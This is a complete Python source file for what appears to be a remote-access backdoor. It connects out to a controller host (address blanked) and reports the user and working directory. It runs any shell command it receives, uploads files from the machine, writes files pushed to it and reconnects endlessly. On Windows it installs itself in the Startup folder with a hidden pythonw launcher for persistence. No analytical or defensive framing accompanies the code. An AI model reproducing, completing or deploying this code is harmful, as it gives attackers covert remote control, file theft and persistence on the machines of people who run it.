import socket
import json
import threading
import shutil
import stat
import time
import subprocess
import os
import sys
import base64
from typing import Optional, Dict, Any

CLIENT_HOST = "........"
CLIENT_PORT = ....
MSG_DELIM = "\n"
RECV_SIZE = 4096
CONNECT_TIMEOUT = 5
SOCKET_TIMEOUT = None
HEARTBEAT_INTERVAL = 30
FILE_CHUNK_SIZE = 32768  # 32KB


RETRY_WINDOW = 10       
REST_INTERVAL = 10      
RETRY_ATTEMPT_INTERVAL = 1  


def dumps(obj: Dict[str, Any]) -> str:
    return json.dumps(obj, ensure_ascii=False) + MSG_DELIM


class Connection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self._recv_buffer = ""

    def connect_client(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(CONNECT_TIMEOUT)
            self.sock.connect((self.host, self.port))
            self.sock.settimeout(SOCKET_TIMEOUT)
            print(f"[*] Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            
            print(f"[!] Connection error: {e}")
            self.close()
            return False

    def close(self):
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass
        finally:
            self.sock = None

    def send(self, data: Dict[str, Any]) -> bool:
        if not self.sock:
            return False
        try:
            payload = dumps(data).encode("utf-8")
            self.sock.sendall(payload)
            return True
        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"[!] Send failed: {e}")
            self.close()
            return False
        except Exception as e:
            print(f"[!] Unexpected send error: {e}")
            self.close()
            return False

    def _extract_one_message(self) -> Optional[str]:
        if MSG_DELIM in self._recv_buffer:
            parts = self._recv_buffer.split(MSG_DELIM)
            msg = parts[0]
            rest = MSG_DELIM.join(parts[1:])
            self._recv_buffer = rest
            return msg
        return None

    def receive(self) -> Optional[Dict[str, Any]]:
        if not self.sock:
            return None
        try:
            m = self._extract_one_message()
            if m is not None:
                return self._parse_message_str(m)
            while True:
                chunk = self.sock.recv(RECV_SIZE)
                if not chunk:
                    print("[*] Peer closed connection (EOF).")
                    return None
                try:
                    self._recv_buffer += chunk.decode("utf-8", errors="replace")
                except Exception:
                    self._recv_buffer += chunk.decode(errors="ignore")
                m = self._extract_one_message()
                if m is not None:
                    return self._parse_message_str(m)
        except socket.timeout:
            return {}
        except Exception as e:
            print(f"[!] Receive error: {e}")
            self.close()
            return None

    def _parse_message_str(self, raw: str) -> Optional[Dict[str, Any]]:
        raw = raw.strip()
        if raw == "":
            return None
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            return {"command": raw}
        if isinstance(parsed, dict):
            return parsed
        return {"command": parsed}


def send_file_to_server(path, conn: Connection, cmd_id=None, chunk_size=FILE_CHUNK_SIZE):
    try:
        size = os.path.getsize(path)
        name = os.path.basename(path)
    except Exception as e:
        conn.send({"status":"error", "msg":f"open error: {e}", "id": cmd_id})
        return

    conn.send({"status":"file_start", "name": name, "size": size, "id": cmd_id})

    try:
        with open(path, "rb") as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                b64 = base64.b64encode(chunk).decode('ascii')
                conn.send({"status":"file_chunk", "data": b64, "id": cmd_id})
        conn.send({"status":"file_end", "id": cmd_id})
    except Exception as e:
        conn.send({"status":"error", "msg":f"read error: {e}", "id": cmd_id})


def prepare_receive_file(cmd_id, dest_path, conn: Connection):
    
    try:
        out_f = open(dest_path, "wb")
    except Exception as e:
        conn.send({"status":"error", "msg":f"open dest error: {e}", "id": cmd_id})
        return False
    if not hasattr(prepare_receive_file, "_active"):
        prepare_receive_file._active = {}
    prepare_receive_file._active[cmd_id] = {"f": out_f, "path": dest_path}
    conn.send({"status":"ok", "msg":"ready to receive", "id": cmd_id})
    return True


def handle_put_chunk(msg, conn: Connection):
    cid = msg.get("id")
    data = msg.get("data")
    rec = getattr(prepare_receive_file, "_active", {}).get(cid)
    if not rec:
        conn.send({"status":"error","msg":"no active receiver","id":cid})
        return
    try:
        rec['f'].write(base64.b64decode(data))
    except Exception as e:
        conn.send({"status":"error","msg":f"write error: {e}", "id": cid})
        try:
            rec['f'].close()
        except:
            pass
        prepare_receive_file._active.pop(cid, None)


def handle_put_end(msg, conn: Connection):
    cid = msg.get("id")
    rec = getattr(prepare_receive_file, "_active", {}).pop(cid, None)
    if rec:
        try:
            rec['f'].close()
            conn.send({"status":"ok","msg":f"received {rec['path']}", "id": cid})
        except Exception as e:
            conn.send({"status":"error","msg":str(e), "id": cid})


def execute_command(command: str) -> Dict[str, Any]:
    command = command.strip()

    
    if command.lower().startswith("cd "):
        try:
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return {"status": "ok", "cwd": os.getcwd()}
        except Exception as e:
            return {"status": "error", "msg": str(e)}

    
    if os.name == 'nt':
        translations = {
            'ls': 'dir',
            'pwd': 'cd',
            'clear': 'cls',
            'cat': 'type',
            'mv': 'move',
            'cp': 'copy',
            'rm': 'del',
            'whoami': 'whoami',
        }
        parts = command.split()
        if parts and parts[0].lower() in translations:
            parts[0] = translations[parts[0].lower()]
            command = " ".join(parts)

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
            cwd=os.getcwd(),
            timeout=30
        )
        stdout = result.stdout or ""
        stderr = result.stderr or ""
        output = stdout + stderr
        output = output.encode("utf-8", errors="replace").decode("utf-8", errors="replace")
        return {"status": "output", "output": output, "returncode": result.returncode}
    except subprocess.TimeoutExpired:
        return {"status": "error", "msg": "Command execution timed out."}
    except Exception as e:
        return {"status": "error", "msg": str(e)}


def heartbeat_sender(conn: Connection):
    while conn.sock:
        time.sleep(HEARTBEAT_INTERVAL)
        try:
            ok = conn.send({"status": "heartbeat", "time": time.time()})
            if not ok:
                break
        except Exception:
            break


def run_client():
    
    while True:
        conn = Connection(CLIENT_HOST, CLIENT_PORT)

        
        start = time.time()
        connected = False
        print(f"[*] Beginning connection attempts for {RETRY_WINDOW} seconds...")
        while time.time() - start < RETRY_WINDOW:
            try:
                if conn.connect_client():
                    connected = True
                    break
            except KeyboardInterrupt:
                print("\n[*] Interrupted during connection attempts.")
                conn.close()
                return
            time.sleep(RETRY_ATTEMPT_INTERVAL)

        if not connected:
            print(f"[!] Could not connect during {RETRY_WINDOW}s window. Resting for {REST_INTERVAL}s before next window.")
            conn.close()
            try:
                time.sleep(REST_INTERVAL)
            except KeyboardInterrupt:
                print("\n[*] Interrupted during rest interval. Exiting.")
                return
            continue

        
        try:
            current_cwd = os.getcwd()
            try:
                user = os.getlogin()
            except Exception:
                user = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"

            initial_status = {"status": "connected", "cwd": current_cwd, "user": user}
            if not conn.send(initial_status):
                print("[!] Failed to send initial status after connection.")
                conn.close()
                continue

            print(f"[*] Sent initial status. Current dir: {initial_status.get('cwd', 'N/A')}")

            hb_thread = threading.Thread(target=heartbeat_sender, args=(conn,), daemon=True)
            hb_thread.start()

            
            while conn.sock:
                command_data = conn.receive()

                if command_data is None:
                    break
                if command_data == {}:
                    continue

                if not isinstance(command_data, dict):
                    try:
                        command_data = json.loads(command_data)
                    except Exception:
                        print(f"[!] Received invalid command data: {command_data!r}")
                        conn.send({"status": "error", "msg": "Invalid command format received."})
                        continue


                action = command_data.get("action")
                cmd_id = command_data.get("id", None)

                
                if action == "get":
                    path = command_data.get("path")
                    if not path:
                        conn.send({"status":"error","msg":"missing path","id":cmd_id})
                    else:
                        send_file_to_server(path, conn, cmd_id=cmd_id)
                    continue

                
                if action == "put":
                    dest = command_data.get("path")
                    if not dest:
                        conn.send({"status":"error","msg":"missing dest path","id":cmd_id})
                    else:
                        prepare_receive_file(cmd_id, dest, conn)
                    continue

                
                if action == "put_chunk":
                    handle_put_chunk(command_data, conn)
                    continue

                if action == "put_end":
                    handle_put_end(command_data, conn)
                    continue

                
                command = command_data.get("command")
                if not command:
                    continue

                print(f"[>] Executing command: {command}")

                if isinstance(command, str) and command.lower() in ("exit", "quit"):
                    resp = {"status": "exiting", "msg": "Client shutting down."}
                    if cmd_id is not None:
                        resp["id"] = cmd_id
                    conn.send(resp)
                    break

                response = execute_command(command)
                if cmd_id is not None:
                    response["id"] = cmd_id

                if not conn.send(response):
                    break

        except KeyboardInterrupt:
            print("\n[*] Interrupted by user. Exiting.")
            conn.close()
            return
        finally:
            conn.close()
            print("[*] Disconnected; returning to retry loop.")

def _ensure_dir(path):
    try:
        os.makedirs(path, exist_ok=True)
        return True
    except Exception:
        return False

def _safe_copy(src, dst):
    try:
        
        parent = os.path.dirname(dst)
        if parent and not os.path.exists(parent):
            _ensure_dir(parent)
        shutil.copy2(src, dst)
        return True
    except Exception as e:
        print(f"[!] copy error: {e}")
        return False

def _write_launcher_bat(script_path, bat_path):

    
    try:
        pythonw = shutil.which("pythonw") or shutil.which("python")
        if not pythonw:
            
            content = f'@echo off\r\nstart "" "{script_path}"\r\n'
        else:
            
            
            content = f'@echo off\r\n"{pythonw}" "{script_path}"\r\n'
        with open(bat_path, "w", newline="\r\n") as f:
            f.write(content)
        
        try:
            st = os.stat(bat_path)
            os.chmod(bat_path, st.st_mode | stat.S_IEXEC)
        except Exception:
            pass
        return True
    except Exception as e:
        print(f"[!] failed to write launcher bat: {e}")
        return False

if __name__ == "__main__":
    
    if os.name == "nt":
        try:
            
            current_path = os.path.abspath(sys.argv[0] or __file__)
            
            startup_path = os.path.join(
                os.getenv("APPDATA") or "",
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            
            if not os.path.isdir(startup_path):
                _ensure_dir(startup_path)

            
            target_path = os.path.join(startup_path, os.path.basename(current_path))

            if current_path.lower() != target_path.lower():
                copied = _safe_copy(current_path, target_path)
                if copied:
                    print(f"[+] Script copied to startup: {target_path}")
                else:
                    print("[!] Failed to copy script into Startup.")

                
                bat_name = os.path.splitext(os.path.basename(current_path))[0] + ".bat"
                bat_path = os.path.join(startup_path, bat_name)

                if _write_launcher_bat(target_path, bat_path):
                    print(f"[+] Launcher .bat created at: {bat_path}")

                
        except Exception as e:
            print(f"[!] Failed to install to startup: {e}")

    
    run_client()
